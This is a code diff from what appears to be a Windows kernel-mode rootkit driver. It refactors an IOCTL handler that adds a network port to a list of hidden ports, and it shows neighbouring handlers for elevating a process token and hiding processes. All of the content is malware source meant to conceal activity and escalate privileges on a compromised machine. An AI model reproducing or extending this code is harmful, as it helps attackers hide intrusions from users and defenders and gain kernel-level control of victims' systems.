@@ -2,7 +2,7 @@
 #include "lib/Process.h"
 #include "Capabilities/ProcessCapabilities/ProcessHider.h"
 #include "Capabilities/TokenCapabilities/TokenElevator.h"
-#include "NetworkHandler.h"
+#include "Capabilities/NetworkCapabilites/PortHider.h"
 #include "Config.h"
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
@@ -42,27 +42,27 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 
 NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
-	auto port = (USHORT*)Irp->AssociatedIrp.SystemBuffer;
+	auto port = reinterpret_cast<PUSHORT>(Irp->AssociatedIrp.SystemBuffer);
 
-	if (*port <= static_cast < USHORT>(0) || *port > static_cast <USHORT>(65535))
-	{
+	if (*port <= static_cast<USHORT>(0) || *port > static_cast<USHORT>(65535)) {
 		return STATUS_INVALID_PARAMETER;
 	}
 
 	//Add the desired port to the list of hidden ports.
-	auto size = sizeof(NetworkHandler::HiddenPort);
-	auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, POOL_TAG);
+	//auto size = sizeof(NetworkHandler::HiddenPort);
+	//auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, POOL_TAG);
 
-	if (portToHide == nullptr)
-	{
-		status = STATUS_INSUFFICIENT_RESOURCES;
-		goto ERROR;
-	}
-	
-	portToHide->HiddenPort = NetworkHandler::htons(*port);
-	NetworkHandler::addHiddenPort(&portToHide->Entry);
+	//if (portToHide == nullptr)
+	//{
+	//	status = STATUS_INSUFFICIENT_RESOURCES;
+	//	goto ERROR;
+	//}
 
-ERROR:
+	//portToHide->HiddenPort = NetworkHandler::htons(*port);
+	//NetworkHandler::addHiddenPort(&portToHide->Entry);
+	auto portHider = PortHider();
+	portHider.addHiddenPort(*port);
+
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
 	return status;
